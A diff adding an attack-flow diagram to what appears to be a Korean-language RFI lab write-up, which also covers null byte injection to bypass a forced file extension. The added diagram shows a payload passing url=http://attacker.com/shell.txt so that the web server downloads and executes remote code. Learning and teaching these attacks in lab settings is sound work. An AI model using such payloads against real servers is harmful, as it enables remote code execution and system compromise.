@@ -37,6 +37,14 @@ GET /rfi/silver?url=http://example.com/readme HTTP/1.1
 
 ## 💥 2. 취약점 식별 및 필터 우회 전략 (Exploitation)
 
+### 📊 공격 흐름도 (Attack Flow)
+
+```text
+[ Attacker ] --(url=http://attacker.com/shell.txt)--> [ Web Server ]
+                                                      |-- Downloads & Executes Code
+```
+
+
 강제 확장자(Appended Extension)를 우회하는 방법은 크게 두 가지가 있습니다.
 
 ### 💡 전략 1: 널 바이트 인젝션 (Null Byte Injection)
